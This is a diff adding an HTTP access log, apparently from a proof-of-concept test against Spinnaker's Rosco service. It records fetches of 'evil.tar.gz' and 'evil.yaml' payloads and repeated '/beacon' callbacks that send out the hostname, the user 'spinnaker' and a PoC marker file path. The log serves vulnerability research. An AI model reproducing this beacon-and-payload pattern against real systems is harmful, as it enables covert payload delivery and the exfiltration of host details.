@@ -1,0 +1,30 @@
+172.18.0.5 - - [19/Sep/2026 02:35:13] "GET /evil.tar.gz HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 02:35:13] "GET /evil_plain.tar.gz HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 02:44:12] "GET /evil.tar.gz HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:20:49] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:20:49] "GET /beacon?host=44c48ade52c2&user=spinnaker HTTP/1.1" 404 -
+172.18.0.7 - - [19/Sep/2026 03:21:02] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:21:02] "GET /beacon?host=44c48ade52c2&user=spinnaker HTTP/1.1" 404 -
+172.18.0.7 - - [19/Sep/2026 03:22:10] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:22:10] "GET /beacon?host=44c48ade52c2&user=spinnaker&marker=/tmp/ROSCO_UI_POC.txt HTTP/1.1" 404 -
+172.18.0.7 - - [19/Sep/2026 03:22:10] "HEAD /charts/demo-0.1.0.tgz HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:22:10] "GET /charts/demo-0.1.0.tgz HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:22:53] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:00] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:01] "GET /clean.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:01] "GET /charts/demo-0.1.0.tgz HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:06] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:06] "GET /clean.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:47] "GET /clean.yaml HTTP/1.1" 200 -
+172.18.0.5 - - [19/Sep/2026 03:23:47] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:23:48] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:23:48] "GET /beacon?host=44c48ade52c2&user=spinnaker&marker=/tmp/ROSCO_UI_POC.txt HTTP/1.1" 404 -
+172.18.0.5 - - [19/Sep/2026 03:34:35] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:34:36] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:34:36] "GET /beacon?host=44c48ade52c2&user=spinnaker&marker=/tmp/ROSCO_UI_POC.txt HTTP/1.1" 404 -
+172.18.0.5 - - [19/Sep/2026 03:41:03] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:41:04] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:41:04] "GET /beacon?host=44c48ade52c2&user=spinnaker&marker=/tmp/ROSCO_UI_POC.txt HTTP/1.1" 404 -
+172.18.0.5 - - [19/Sep/2026 03:42:01] "GET /evil.yaml HTTP/1.1" 200 -
+172.18.0.7 - - [19/Sep/2026 03:42:01] code 404, message File not found
+172.18.0.7 - - [19/Sep/2026 03:42:01] "GET /beacon?host=44c48ade52c2&user=spinnaker&marker=/tmp/ROSCO_UI_POC.txt HTTP/1.1" 404 -
